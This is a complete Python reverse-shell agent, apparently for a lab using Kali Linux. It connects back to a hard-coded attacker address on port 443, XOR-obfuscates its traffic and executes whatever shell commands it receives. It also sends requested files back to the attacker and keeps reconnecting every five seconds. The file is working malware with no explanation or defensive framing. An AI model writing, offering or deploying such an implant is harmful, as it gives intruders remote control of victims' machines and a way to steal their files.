# agent_reverse.py
import socket
import subprocess
import time
import os

KEY = b'secretkey'
REVERSE_HOST = "192.168.56.103"  # 🔧 CHANGE to your Kali IP
REVERSE_PORT = 443
BUFFER_SIZE = 4096

def xor_encrypt(data):
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((REVERSE_HOST, REVERSE_PORT))

            while True:
                data = xor_encrypt(s.recv(BUFFER_SIZE))
                cmd = data.decode().strip()

                if cmd == "exit":
                    break

                elif cmd.startswith("get "):
                    filepath = cmd[4:].strip()
                    if not os.path.exists(filepath):
                        s.send(xor_encrypt(b"[!] File not found\n"))
                    else:
                        try:
                            with open(filepath, "rb") as f:
                                filedata = f.read() + b"<<END_OF_FILE>>"
                            s.send(xor_encrypt(filedata))
                        except Exception as e:
                            s.send(xor_encrypt(f"[!] Error reading file: {e}".encode()))

                else:
                    output = subprocess.getoutput(cmd)
                    if not output.strip():
                        output = "[NO OUTPUT]"
                    output += "\n<<END_OF_CMD>>"
                    s.send(xor_encrypt(output.encode()))
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    connect()
